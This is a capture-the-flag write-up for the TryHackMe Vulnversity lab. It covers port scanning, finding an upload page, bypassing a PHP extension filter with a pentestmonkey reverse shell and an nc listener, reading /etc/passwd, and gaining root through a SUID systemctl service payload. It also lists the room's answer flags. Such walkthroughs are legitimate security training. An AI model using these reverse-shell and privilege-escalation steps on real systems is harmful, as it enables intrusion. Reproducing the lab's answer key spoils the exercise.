# TryHackMe [Vulnversity](https://tryhackme.com/room/vulnversity)
### References
* Dias, D. (2015, March 22). daviddias/node-dirbuster. GitHub. https://github.com/daviddias/node-dirbuster/blob/master/lists/directory-list-2.3-medium.txt
* Hammond, J. (2020). TryHackMe! Abusing SETUID Binaries - Vulnversity [YouTube Video]. In YouTube. https://youtu.be/hvYWCegfEZs
* Pinna, E., & Cardaci, A. (2018). systemctl. GTFOBins. https://gtfobins.github.io/gtfobins/systemctl/
## Scan the box, how many ports are open?
* `nmap` indicates that ports 21, 22, 445, 3128, 3333 are open:
```bash
$ nmap -sV -sC <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-11 18:24 AEST
Nmap scan report for 10.10.223.231
Host is up (0.29s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2021-04-11T04:25:11-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-04-11T08:25:10
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.98 seconds
```
**Answer**: `6`
## What version of the squid proxy is running on the machine?
**Answer**: `3.5.12`
## How many ports will `nmap` scan if the flag `-p-400` was used?
* According to `man nmap`, the `-p-400` flag will tell `nmap` to scan all ports from 0 to 399:
> -p <port ranges>: Only scan specified ports

**Answer**: `400`
## Using the `nmap` flag `-n` what will it not resolve?
* According to `man nmap`, `-n` turns off DNS discovery:
> -n/-R: Never do DNS resolution/Always resolve

**Answer**: `DNS`
## What is the most likely operating system this machine is running?
* According to the previous `nmap` scans, the server runs Apache for Ubuntu.
> 3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))

**Answer**: `Ubuntu`
## What port is the web server running on?
* According to the previous `nmap` scans, the server runs on port 3333.
> 3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))

**Answer**: `3333`
## What is the directory that has an upload form page?
1. By running `gobuster dir -u http://<MACHINE_IP>:3333 -w $(pwd)/directory-list-2.3-medium.txt`, we can see multiple HTTP endpoints that could be lead to an upload page.
```
/images               (Status: 301) [Size: 322] [--> http://10.10.223.231:3333/images/]
/css                  (Status: 301) [Size: 319] [--> http://10.10.223.231:3333/css/]   
/js                   (Status: 301) [Size: 318] [--> http://10.10.223.231:3333/js/]    
/fonts                (Status: 301) [Size: 321] [--> http://10.10.223.231:3333/fonts/] 
/internal             (Status: 301) [Size: 324] [--> http://10.10.223.231:3333/internal/]
```
2. From trial and error, `http://<MACHINE_IP>:3333/internal/` contains an upload page:
![http://<MACHINE_IP>:3333/internal/](internal.jpg)
## Try upload a few file types to the server, what common extension seems to be blocked?
* PHP files are commonly used to spawn a reverse shell.

**Answer**: `.php`
## What extension is allowed?
1. Download the [PHP file](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) written by @pentestmonkey.
2. Modify the `$ip` variable to your TryHackMe IP address (green bubble on the navbar), and the `$port` variable to `443`.
```php
$ip = '<OPENVPN_IP>';
$port = 1234;
```
3.  Run `sudo nc -lvnp 1234` and leave process running.
* Run [file_ext_test.py](file_ext_test.py) to check the server's response to various PHP-related file extensions.
```bash
$ python file_ext_test.py 
.php not allowed
.php3 not allowed
.php4.php5 not allowed
.phtml is allowed
```

**Answer**: `.phtml`
## What is the name of the user who manages the webserver?
1. Switch to an interactive shell with `python -c 'import pty;pty.spawn("/bin/bash")'`
2. List users listed at `/etc/passwd`:
```bash
www-data@vulnuniversity:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:111:119:ftp daemon,,,:/srv/ftp:/bin/false
bill:x:1000:1000:,,,:/home/bill:/bin/bash
```

**Answer**: `bill`
## What is the user flag?
1. Go to `bill`'s home directory with `cd /home/bill`.
2. List directory content and extract `user.txt`:
```bash
www-data@vulnuniversity:/$ cd /home/bill
www-data@vulnuniversity:/home/bill$ ls  
user.txt
www-data@vulnuniversity:/home/bill$ cat user.txt
8bd7992fbe8a6ad22a63361004cfcedb
```

**Answer**: `8bd7992fbe8a6ad22a63361004cfcedb`
## On the system, search for all SUID files. What file stands out?
1. From searching for all SUID files, `/bin/systemctl` stands out since its a crucial program in Linux systems.
```bash
www-data@vulnuniversity:/home/bill$ find / -perm -4000 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

**Answer**: `/bin/systemctl`
## Become root and get the last flag (/root/root.txt)
1. According to [GTFOBins' `systemctl`](https://gtfobins.github.io/gtfobins/systemctl/) page, `systemctl` can be used to gain root privileges:
```bash
www-data@vulnuniversity:/$ TF=$(mktemp).service
www-data@vulnuniversity:/$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "chmod +s /bin/bash"
> [Install]
> WantedBy=multi-user.target' > $TF
www-data@vulnuniversity:/$ /bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.oAjhWlKeGY.service to /tmp/tmp.oAjhWlKeGY.service.
www-data@vulnuniversity:/$ /bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.oAjhWlKeGY.service to /tmp/tmp.oAjhWlKeGY.service.
www-data@vulnuniversity:/$ bash -p
bash-4.3# cd /root
bash-4.3# ls
root.txt
bash-4.3# cat root.txt
a58ff8579f0a9270368d33a9966c7fd5
```

**Answer**: `a58ff8579f0a9270368d33a9966c7fd5`